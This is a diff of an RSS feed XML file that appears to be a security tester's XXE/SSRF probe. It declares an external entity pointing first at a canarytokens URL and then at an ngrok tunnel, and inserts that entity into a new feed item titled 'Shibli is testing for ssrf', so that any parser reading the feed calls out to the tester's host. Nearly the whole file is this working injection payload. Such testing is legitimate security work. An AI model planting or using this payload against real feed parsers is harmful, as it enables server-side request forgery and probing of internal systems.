@@ -1,12 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "http://canarytokens.com/history?token=uyga7ppcdrgsav0nz96pohkvq&auth=c3f09af947ffd642f8ff9783ac79ff91" >]>
+<!ENTITY xxe SYSTEM "http://0d723cb4.ngrok.io" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title>The Blog Shibli &xxe;</title>
+    <title>The Blog Shibli</title>
     <link>http://0d723cb4.ngrok.io</link>
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+    <item>
+        <title>Shibli is testing for ssrf</title>
+        <link>&xxe;</link>
+        <description>This is a new post by mohd shibli</description>
+        <author>author@example.com</author>
+        <pubDate>Mon, 28 March 2020 00:00:00 -0000</pubDate>
+    </item>
     <item>
         <title>New sample post</title>
         <link>http://0d723cb4.ngrok.io</link>
